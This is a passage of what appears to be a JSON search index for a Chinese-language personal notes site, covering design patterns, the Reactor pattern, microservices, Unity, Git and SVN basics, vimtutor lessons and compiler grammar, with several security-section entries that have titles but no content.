这个类可以播放其他格式的音频文件。 为了实现这个功能：我们创建了一个实现了 AdvancedMediaPlayer 的一个适配器类 MediaAdapter，并使用这个接口定义的方法播所需要的格式。  这些类的结构图大致如下：\n"},{"id":401,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/7.%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/","title":"7.桥接模式","section":"2.结构型模式","content":"桥接模式 #  桥接模式（Bridge Pattern）是用于把抽象化与实现化解耦，使得二者可以独立变化。\n介绍 #  意图：\n  将抽象部分与实现部分分离，使它们都可以独立的变化。\n  在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活。\n  优点：\n 抽象和实现的分离。 优秀的扩展能力。 实现细节对客户透明。  缺点：\n 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程。  例子 #  我们以前端中常见的功能绘图为例：\n 假设我们希望：对外统一提供一个类 Shape 用于绘制图形； 为了实现不同形状的绘制，我们需要：用于指定形状的类，一定要实现某些函数或满足一定的规则，于是我们定义了一个 DrawAPI 接口，传入不同的类需要实现这个接口；  比如我们可以完成绘制 RedCircle、GreenCircle，则其依赖图如下：\n"},{"id":402,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/8.%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"8.过滤器模式","section":"2.结构型模式","content":"过滤器模式 #  过滤器模式（Filter Pattern）或标准模式（Criteria Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。\n"},{"id":403,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/9.%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/","title":"9.组合模式","section":"2.结构型模式","content":"组合模式 #  组合模式（Composite Pattern），又叫部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。\n介绍 #  意图：\n 将对象组合成树形结构以表示\u0026quot;部分-整体\u0026quot;的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。 当你有以下想法时，你可以使用组合模式：  您想表示对象的部分-整体层次结构（树形结构）。 您希望用户忽略组合对象与单个对象的不同，用户将统一地使用组合结构中的所有对象。    应用实例：\n 算术表达式包括操作数、操作符和另一个操作数，其中，另一个操作符也可以是操作数、操作符和另一个操作数。 在 JAVA AWT 和 SWING 中，对于 Button 和 Checkbox 是树叶，Container 是树枝。  优点：\n 高层模块调用简单。 节点自由增加。  缺点：\n 在使用组合模式时，其叶子和树枝的声明都是实现类，而不是接口，违反了依赖倒置原则。  实现 #  以公司的雇员举例子：\n 我们首先用一个类 Employee 表示公司中的所有雇员，它的所有属性足以满足需求； 然后为了表示公司雇员之间的层级关系，我们令每一个雇员持有一个下属的列表。  依赖关系如下图所示：\n"},{"id":404,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/14.%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/","title":"14.责任链模式","section":"3.行为型模式","content":"责任链模式 #  顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。\n介绍 #  意图：\n 避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。  优点：\n 降低耦合度。它将请求的发送者和接收者解耦。 简化了对象。使得对象不需要知道链的结构。 增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。 增加新的请求处理类很方便。  缺点：\n 不能保证请求一定被接收。 系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。 可能不容易观察运行时的特征，有碍于除错。  "},{"id":405,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/15.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/","title":"15.命令模式","section":"3.行为型模式","content":"命令模式 #  命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。\n请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。\n介绍 #  意图：\n 将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化； 对行为请求者与请求实现者进行解耦合；  优点：\n 降低了系统耦合度。 新的命令可以很容易添加到系统中去。  缺点：\n 使用命令模式可能会导致某些系统有过多的具体命令类。  "},{"id":406,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/16.%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"16.解释器模式","section":"3.行为型模式","content":"解释器模式 #  解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式，它属于行为型模式。\n这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。\n介绍 #  意图：\n  给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。\n  对于一些固定文法构建一个解释句子的解释器。\n  **如何解决：**构建语法树，定义终结符与非终结符。\n应用实例：\n 编译器、运算表达式计算。 一个简单语法需要解释的场景。  优点：\n 可扩展性比较好，灵活。 增加了新的解释表达式的方式。 易于实现简单文法。  缺点：\n 可利用场景比较少。 对于复杂的文法比较难维护。 解释器模式会引起类膨胀。 解释器模式采用递归调用方法。  PostScript:\n 可利用场景比较少，JAVA 中如果碰到可以用 expression4J 代替。  "},{"id":407,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/17.%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"17.迭代器模式","section":"3.行为型模式","content":"迭代器模式 #  迭代器模式（Iterator Pattern）是 Java 和 .Net 编程环境中非常常用的设计模式。这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。\n介绍 #  意图：\n 提供一种方法顺序访问一个聚合对象中各个元素, 而又无须暴露该对象的内部表示。 主要有以下的需求时，可以使用迭代器模式：  访问一个聚合对象的内容而无须暴露它的内部表示。 需要为聚合对象提供多种遍历方式。 为遍历不同的聚合结构提供一个统一的接口。    优点：\n 它支持以不同的方式遍历一个聚合对象。 迭代器简化了聚合类。 在同一个聚合上可以有多个遍历。 在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。  缺点：\n 由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。  "},{"id":408,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/18.%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"18.中介者模式","section":"3.行为型模式","content":"中介者模式 #  中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。\n这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。\n介绍 #  "},{"id":409,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/reactor%E6%A8%A1%E5%BC%8F/","title":"Reactor模式","section":"DesignPatterns","content":"Reactor 模式 #  一个网络连接对应于一个线程处理，是最原始的 Web 应用模型：\n但是这种模型对每个连接都创造一个 handler 容易遇到瓶颈，负载增加时性能下降非常快：\n accept 方法会阻塞等待 client 连接，直到 client 连接成功； read 方法从 socket inputstream 读取数据，会阻塞线程直到完成数据读取； write 方法会写入输入到 socket outstream，会阻塞线程直到数据写完；  上面列举的三种方法的特点是：都是引起 IO 的阻塞方法，这种原始的应用模式会导致大量线程空转。使用一个中心的 Reactor 来处理所有会引起阻塞的方法，就是 Reactor 模式：\n而上面这种设计模式，Reactor 运行在单线程中，容易成为高并发计算机系统的性能瓶颈。\n于是我们可以用一个线程池处理已经连接的所有客户端：\n在多 CPU 的机器上 Reactor 又可以拆分成 mainReactor 和 subReactor：\n"},{"id":410,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/uml/","title":"Uml","section":"DesignPatterns","content":"示例 #  classDiagram 继承 \u0026lt;|-- Inheritance 组成 *-- Composition 聚合 o-- Aggregation 关联 \u0026lt;-- Association 链接 -- Link Solid 依赖 \u0026lt;.. Dependency 实现 \u0026lt;|.. Realization "},{"id":411,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/%E5%BE%AE%E6%9C%8D%E5%8A%A1/","title":"微服务","section":"SystemDesign","content":"微服务 #  服务发现 #   https://zhuanlan.zhihu.com/p/161277955\n 使用一个名字服务器进行服务发现。解决分布式微服务的网络调用结构问题。\n服务限流 #   https://zhuanlan.zhihu.com/p/65900436\n 服务限流算法：\n 计数器算法、漏桶算法、令牌算法  服务雪崩降级熔断 #  服务雪崩：\n 一个服务失败，导致整条链路的服务都失败的情形，我们称之为服务雪崩。  服务熔断：\n 当下游的服务因为某种原因突然变得不可用或响应过慢，上游服务为了保证自己整体服务的可用性，不再继续调用目标服务，直接返回，快速释放资源。  服务降级：\n 当下游的服务因为某种原因响应过慢，下游服务主动停掉一些不太重要的业务，释放出服务器资源，增加响应速度。  "},{"id":412,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/unity/blending/","title":"Blending","section":"Unity","content":" https://docs.unity3d.com/Manual/SL-Blend.html\n Blending #  概念 #  当图形渲染时，Shader 都执行完、Textures 都渲染完之后，被渲染出的像素就需要被写入屏幕中。\n屏幕中已经存在的像素与新的像素点混合的方式，就被称为 Blend。\n"},{"id":413,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/unity/%E7%89%B9%E6%95%88%E7%B3%BB%E7%BB%9F/","title":"特效系统","section":"Unity","content":"Unity3D 特效系统 #  概述 #  特效系统主要由以下几个部分组成：\n 粒子系统：最常见的特效系统，可以实现风雨雷电、烟雾、火焰等； 拖尾组件：用来实现一些模型在移动时的拖尾效果； 线性组件：可以实现飞机发射的激光炮等； 镜头炫光组件：一般用来实现太阳的镜头映射效果； 光晕组件：放在灯光周围实现光晕效果； 投影组件：投影效果、移动平台上的阴影效果； 屏幕后效：运动模糊、全屏辉光等许多效果； 扩展知识  粒子系统 #  在 Unity 中的位置 Component-\u0026gt;Effects-\u0026gt;Partical System。\n在一个粒子系统被创建之后，可以在右侧的 Inspector 中看到粒子系统的所有子模块的属性。\n下面只记录一些有可能会遇到坑的点：\n  默认粒子的颜色是粉色，并不表示这是他的默认颜色，这表示它丢失了材质。\n粒子的材质可以在 Renderer 这个子模块的 Material 这个属性中选择；\n  Play On Awake 置 true 表示会自动进行播放，若该属性为 false 则需要我们手动调用 play 方法进行播放。\n  "},{"id":414,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/versioncontrol/gitadvance/","title":"Git Advance","section":"VersionControl","content":"Git Advance #  Git 文件系统 #  概述 #  我们在一个 git init 结果的空仓库中，简述一下各个部分的作用：\n.git ├── HEAD // 指示当前被检出的分支 ├── branches // 废弃 ├── config // 项目内的配置文件 ├── description // 供GitWeb程序使用 ├── hooks // 存储钩子脚本 │ ├── applypatch-msg.sample │ ... ├── info // 目录包含一个全局性排除(global exclude)文件， │ └── exclude\t// 用以放置那些不希望被记录在 .gitignore 文件中的忽略模式(ignored patterns) ├── objects // 存储所有数据内容 │ ├── info // 仓库的额外信息 │ └── pack // 压缩后的包文件 └── refs // 存储指向分支的提交对象的指针 ├── heads // 分支 └── tags // 标签 执行以下命令可以查看 Git 目录结构说明：\ngit help gitrepository-layout 存储文件 #  当 Git 存储一个文件时：\n 首先会根据文件内容计算出文件的哈希值 (使用 SHA-1 算法)，结果是 40 位的十六进制字符串。 取前 2 个字符作为目录名，后 38 个字符作为文件名，存储在 .git/objects 文件夹下。  这样给定文件的哈希值，就能在文件系统中直接定位到文件。这种计算方式遍布于 Git 的各种操作中，包括分支、提交记录、tag 等都可以用哈希值来表示。\n以下命令可以查看，一个指定哈希值，对应的文件：\ngit cat-file -p \u0026lt;hash\u0026gt; 存储目录 #  "},{"id":415,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/versioncontrol/svntutorial/","title":"Svn Tutorial","section":"VersionControl","content":" 学习网址：\n https://www.tutorialspoint.com/svn/svn_environment.htm   SVN #  SVN is a Version Control System.\nLife Cycle #   Create Repository: create operation is used to create a new repository. Checkout: Checkout operation is used to create a working copy from the repository. Update: update operation is used to update working copy. Perform Changes:  Rename operation changes the name of the file/directory. Move operation is used to move files/directories from one place to another in a repository tree.   Review Changes:Status operation lists the modifications that have been made to the working copy. Fix Mistakes: Revert operation reverts the modifications that have been made to the working copy. Resolve Conflicts: Merge operation automatically handles everything that can be done safely. Commit changes: Commit operation is used to apply changes from the working copy to the repository.  Checkout Process #  Subversion provides the checkout command to check out a working copy from a repository. Below command will create a new directory in the current working directory with the name project_repo.\n$ svn checkout http://svn.server.com/svn/project_repo --username=tom After every successful checkout operation, the revision number will get printed. If you want to view more information about the repository, then execute the info command:\n$ pwd /home/tom/project_repo/trunk $ svn info Perform Changes #  See changes:\n$ svn status ? array.c ? array Add array.c file to the pending change-list.\n$ svn add array.c A array.c Subversion shows A before array.c, it means, the file is successfully added to the pending change-list:\n$ svn status ? array A array.c To store array.c file to the repository, use the commit command with -m option followed by commit message. If you omit -m option Subversion will bring up the text editor where you can type a multi-line message.\n$ svn commit -m \u0026#34;Initial commit\u0026#34; Adding trunk/array.c Transmitting file data . Committed revision 2. "},{"id":416,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/versioncontrol/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/","title":"版本控制","section":"VersionControl","content":"版本控制 #  现在流行的版本系统主要分为集中式版本系统、分布式版本系统 2 大类。\n集中式版本系统 #  主要的集中式版本控制系统：\n CVS (Concurrent Versions System) free software，以 GNU 版权发行，许多老的 GNU 项目都用 CVS，2008 年后更新不活跃。 Subversion (Apache Subversion) Apache License，top-level Apache project，兼容 CVS。 SVN 则是最著名的集中式版本控制系统。  SVN 的主要特点：\n  SVN 需要一个中心服务器，用来保存所有文件的所有修订版本。\n  客户端只保存最新的版本或者设置为检出某一个历史版本，客户端必须在连接到中心服务器之后才能做出检出某个版本、查询文件修改历史、提交更新等操作。\n  每一次 commit 之前，都需要连接中心服务器获取最新的文件版本，如果中心服务器宕机，则你无法提交任何更新，也无法将项目回溯到历史版本。\n  如果中心服务器发生磁盘故障，而你又没有做任何备份，你将会丢失当前和历史的所有数据。\n  对 分支 的支持较弱，SVN 的分支就是一个完整、独立的文件夹，分支的创建和合并代价都非常高（实际可能会通过硬连接的方式节省空间）；\n  无法追踪目录文件的变化，变更目录需要使用 SVN 命令。\n  管理员能够轻松掌握每一个开发者的权限（Git 自身不支持分支保护）。\n  分布式版本系统 #  主要的分布式管理系统：\n Git 第一个版本由 Linus Torvalds 编写，GNU GPL v2 Mercurial 基本用 python 实现，目前 GNU GPL v2。仍在用它管理的项目  Git 和 Mercurial 都是为了管理 Linux kernel 而开发的，只不过最后社区选择了 Git。\n对于 Git，中心服务器是可选的，客户端不仅仅提取最新版本的文件快照，而是把整个代码仓库完整地镜像下来。这样你在版本控制系统中做出任何提交、检出，比较等操作都是在本地进行，如果用来协同工作的中心服务器发生故障，事后可以用任何一个镜像来恢复代码仓库。\n"},{"id":417,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/vim/1.vimtutor/","title":"1.Vimtutor","section":"Vim","content":" 学习地址：vimtutor\nvimtutor 是一个由 vim 官方提供的教程，在 bash 界面直接运行 vimtutor 即可查看。\n vimtutor #  Lesson 1 #    移动光标：\n ^\rk\r\u0026lt; h l \u0026gt;\rj\rv\rHINT：\n h 的键位于左边，每次按下就会向左移动。 l 的键位于右边，每次按下就会向右移动。 j 键看起来很象一支尖端方向朝下的箭头。    vim 的退出：\n 输入 :q!\u0026lt;Enter\u0026gt; 会退出编辑器并且丢弃进入编辑器之后的所有改动。 按下 :wq\u0026lt;Enter\u0026gt;保存并退出 vim    删除光标所在位置的字符：可以按下 x 键来删除光标所在位置的字符。\n  插入文本：可以按下 i 键来插入字符。\n  添加文本：可以按下 A 键来添加文本（光标会定位到行末）\n  Lesson 2 #    删除类命令：\n 删除单词：按下 dw 可以从光标处删除到一个单词的末尾 删除到行末：输入 d$ 从当前光标删除到行末。    命令和对象：许多改变文本的命令都由一个操作符和一个动作构成。\n比如：\n 以上的删除操作符 d 的命令格式如下：d motion。  其中：\n d ：删除操作符。 motion：删除符的操作对象  motion 的简短动作列表：\n w - 从当前光标当前位置直到下一个单词起始处，不包括它的第一个字符。 e - 从当前光标当前位置直到单词末尾，包括最后一个字符。（与 w 区别为不会删除空格） $ - 从当前光标当前位置直到当前行末。    使用计数指定动作：在动作前输入数字 n，会使该动作重复 n 次。\n示例：\n 输入 2w 使光标向前移动两个单词。 输入 3e 使光标向前移动到第三个单词的末尾。 输入 0 使得光标移动到行首。    使用操作符时，在对象前输入数字 n 可以重复 n 次。\n格式：operator [number] motion\n比如：d2w 可以删除光标所在位置的下两个单词删除。\n  删除整行：连续输入两次 d ，即 dd 可以删除光标所在位置的整行。\n  撤销类命令：\n 撤销最后执行的命令：输入 u 来撤销最后执行的命令。 撤销对整行的修改：输入 U 来撤销对整行的修改。 重做撤销的命令： CTRL+R    Lesson 3 #    Put command: Type p to put previously deleted text after the cursor.\n  Replace command: Type rx to replace the character at the cursor with x.\n  The change operator: To change until the end of a word, type ce.\nThis operator format: c [motion] number , where the motions are the same.\n  Lesson 4 #    Cursor location and file status:\n  Type CTRL-G to show your location in the file and the file status.\nNOTICE: You may see the cursor position in the lower right corner of the screen. This happens when the \u0026lsquo;ruler\u0026rsquo; option is set (see :help \u0026lsquo;ruler\u0026rsquo; )\n  Type G to move to a bottom of the file.\n  Type gg to move you to the start of the file.\n  Type the number of a line, and then G. This will goto a specific line.\n    The search command:\n Type / followed by a phrase to search for the phrase. To search for a phrase in the backward direction, use ? instead of / . To search for the same phrase again, simply type n. findTo search for the same phrase in the opposite direction, type N. To go back to where you came from press CTRL-O, CTRL-I goes forward.    Matching parentheses search: Type % to find a matching ), ], or }.\n  The substitute command:\n Type :s/old/new to substitute \u0026lsquo;new\u0026rsquo; for the first \u0026lsquo;old\u0026rsquo; in a line Type :s/old/new/g to substitute new for all \u0026lsquo;old\u0026rsquo;s on a line type Type :#,#s/old/new/g where #,# are the line numbers of the range of lines where the substitution is to be done. Type :%s/old/new/g to change every occurrence in the whole file. Type :%s/old/new/gc to find every occurrence in the whole file, with a prompt whether to substitute or not.    Lesson 5 #    Execute an external command: Type :! followed by an external command to execute that command.\n NOTICE: All : commands must be finished by hitting \u0026lt;ENTER\u0026gt;.    More on writing files: To save the changes made to the text, type :w FILENAME .\n  Selecting text to write: To save part of the file, type v motion :w FILENAME\n  Retrieving and merging files: To insert the contents of a file, type :r FILENAME\n  PostScript: You can also read the output of an external command.\nFor example, :r !ls reads the output of the ls command and puts it below the cursor.\n    Lesson 6 #    The open command:\n Type o to open a line below the cursor and place you in Insert mode. To open up a line ABOVE the cursor, simply type a capital O    The append command: Type a to insert text AFTER the cursor.\n NOTICE: a, i and A all go to the same Insert mode, the only difference is where the characters are inserted.    Another way to replace: Type a capital R to replace more than one character.\n  Copy and paste text:\n Use y operator to copy text. Use p operator to paste it. PS: Move the cursor to the end of next line j$    Set option: Set an option so a search or substitute ignores case\n  set the ic (ignore case) option by entering: :set ic\n  set the \u0026lsquo;hlsearch\u0026rsquo; (highlight search) and \u0026lsquo;incsearch\u0026rsquo; (show partial matches) options: :set hls is\n  to disable ignoring case by enter: :set noic\n  to remove the highlighting of matches enter: :nohlsearch\n  If you want to ignore case for just one search command, use \\c in the phrase: /ignore\\c \u0026lt;ENTER\u0026gt;\n    Lesson 7 #    Getting help: type one of these three command:\n press the \u0026lt;HELP\u0026gt; key (if you have one) press the \u0026lt;F1\u0026gt; key (if you have one) type :help \u0026lt;ENTER\u0026gt;  You can find help on just about any subject, by giving an argument to the :help command\n :help w :help c_CTRL-D :help insert-index :help user-manual    Create a startup script: editing the following file in Unix :e ~/.vimrc\n for more information, type :help vimrc-intro    Completion: command line completion with CTRL-D and \u0026lt;TAB\u0026gt;\n NOTICE: make sure vim is not in compatible mode: :set nocp    "},{"id":418,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/","title":"01","section":"恶意代码分析","content":"01 #  "},{"id":419,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/","title":"03","section":"恶意代码分析","content":"03 #  "},{"id":420,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/","title":"04","section":"恶意代码分析","content":"04 #  "},{"id":421,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/05/","title":"05","section":"恶意代码分析","content":"05 #  "},{"id":422,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/","title":"06","section":"恶意代码分析","content":"06 #  "},{"id":423,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/","title":"07","section":"恶意代码分析","content":"07 #  "},{"id":424,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/09/","title":"09","section":"恶意代码分析","content":"09 #  "},{"id":425,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"1.创建型模式","section":"DesignPatterns","content":"1.创建型模式 #  "},{"id":426,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/","title":"1.客户端安全","section":"白帽子讲WEB安全","content":"1.客户端安全 #  "},{"id":427,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E7%89%A9%E7%90%86%E5%B1%82/","title":"1.物理层","section":"计算机网络","content":"1.物理层 #  "},{"id":428,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/","title":"2.服务端安全","section":"白帽子讲WEB安全","content":"2.服务端安全 #  "},{"id":429,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"2.结构型模式","section":"DesignPatterns","content":"2.结构型模式 #  "},{"id":430,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90/","title":"2.语法分析","section":"编译原理","content":" 学习地址：\n国防科技大学MOOC\n 简述概念 #  上下文无关文法：\n 定义：一个上下文无关文法 G 是一个四元式 $$G= (V_T, V_N, S, P)$$，其中：  $$V_T$$：终结符号集合（非空）； $$V_N$$：非终结符集合（非空），且 $$V_T \\cap V_N = \\varnothing$$ $$S$$：文法的开始符号，$$S \\in V_N$$ $$P$$：产生式集合（有限），每个产生式形式为：  $$P \\rightarrow \\alpha, P \\in V_N, \\alpha \\in (V_T \\cup V_N)*$$      直接推出：\n 定义：称 $$\\alpha A \\beta$$ 直接推出 $$\\alpha \\gamma \\beta$$，即：$$\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta$$。仅当 $$A \\rightarrow \\gamma $$ 是一个产生式，且 $$\\alpha, \\beta \\in (V_T \\cup V_N)*$$  推导：\n 如果 $$\\alpha_1 \\Rightarrow \\alpha_2 \\Rightarrow \u0026hellip; \\Rightarrow \\alpha_n$$，则我们称这个序列是从 $$\\alpha_1$$ 到 $$\\alpha_n$$ 的一个推导。若存在一个从 $$\\alpha_1$$ 到 $$\\alpha_n$$ 的推导，则称 $$\\alpha_1$$ 可以推导出 $$\\alpha_n$$。  句型：\n 定义：假定 G 是一个文法，S 是它的开始符号。如果 $$S \\Rightarrow \\alpha$$，则 $$\\alpha$$ 称时一个句型。 由文法的开始符号能够推导出的任意串，都是该文法的一个句型。  句子：仅含终结符号的句型。\n语言：\n 文法所产生的句子的全体是一个语言，将它记作 $$L(G)$$。  $$L(G) = {\\alpha | S \\Rightarrow \\alpha, \\alpha \\in V_T^*}$$    语法分析任务：分析一个文法的句子的结构\n语法分析器的功能：按照文法的产生式（语言的语法规则），识别输入符号串是否为一个句子（合式程序）\n"},{"id":431,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/","title":"2.进程与线程","section":"操作系统","content":"进程与线程 #  "},{"id":432,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E9%93%BE%E8%B7%AF%E5%B1%82/","title":"2.链路层","section":"计算机网络","content":"2.链路层 #  "},{"id":433,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/2019de1ctf/","title":"2019de1ctf","section":"题目","content":"2019De1Ctf #  "},{"id":434,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/2019ogeek/","title":"2019OGeek","section":"题目","content":"2019OGeek #  "},{"id":435,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/miniprogram/3.logiclayer/","title":"3.LogicLayer","section":"MiniProgram","content":"视图层 #  逻辑层将数据进行处理后发送给视图层，同时接受视图层的事件反馈。\n开发者写的所有代码最终将会打包成一份 JavaScript 文件，并在小程序启动的时候运行，直到小程序销毁。这一行为类似 ServiceWorker，所以逻辑层也称之为 App Service。\n在 JavaScript 的基础上，我们增加了一些功能，以方便小程序的开发：\n 增加 App 和 Page 方法，进行程序和页面的注册。 增加 getApp 和 getCurrentPages 方法，分别用来获取 App 实例和当前页面栈。 提供丰富的 API，如微信用户数据，扫一扫，支付等微信特有能力。 每个页面有独立的作用域，并提供模块化能力。  注意：小程序框架的逻辑层并非运行在浏览器中，因此 JavaScript 在 web 中一些能力都无法使用，如 window，document等。\n"},{"id":436,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"3.网络层","section":"计算机网络","content":"3.网络层 #  "},{"id":437,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"3.行为型模式","section":"DesignPatterns","content":"3.行为型模式 #  